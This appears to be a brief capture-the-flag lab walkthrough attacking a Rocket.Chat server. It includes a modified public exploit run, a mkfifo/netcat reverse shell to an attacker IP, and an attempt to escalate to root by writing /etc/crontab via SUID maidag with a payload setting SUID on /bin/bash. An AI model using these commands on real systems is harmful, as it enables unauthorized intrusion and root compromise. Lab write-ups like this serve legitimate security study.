nmap shows ports 22 and 3000 open.
Upon visiting 3000, we see it is a rocket.chat application, asking for a login. Looking for exploits in searchsploit, we find an exploit that requires a low-privileged user email and an admin email.
So we register a new account
test@test.com : Testtest8!
```zsh
/opt/venv1/bin/python 49960.py -u test@test.com -a admin@chatty.offsec -t http://192.168.182.164:3000
#Was giving out wring tokens and trying to reset normal user password.
#Upon closer inspection of the exploit, we see it is using a hardcoded pasword for the normal user account as well
#so we sync the passwords, and comment the part where it resets the normal user password
#Which gives us a shell. From there, 
mkfifo /tmp/f; nc 192.168.45.244 22 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f
#To get a real shell

find / -type f -perm -04000 -ls 2>/dev/null
#shows we SUID bit is set for maidag.
#no gtfo, but looking up for exploits, we find one
#Ideally, the --url parameter is supposed to be able to write into any file as root. If that file happens to be crontab, the command gets executed
maidag --url /etc/crontab < cron_lines

cat cron_lines
#first line should be commented or empty
*/1 * * * * root /tmp/payload.sh

cat payload.sh
chmod +s /bin/bash

maybe cron daemon wasnt running, but we never got root
```
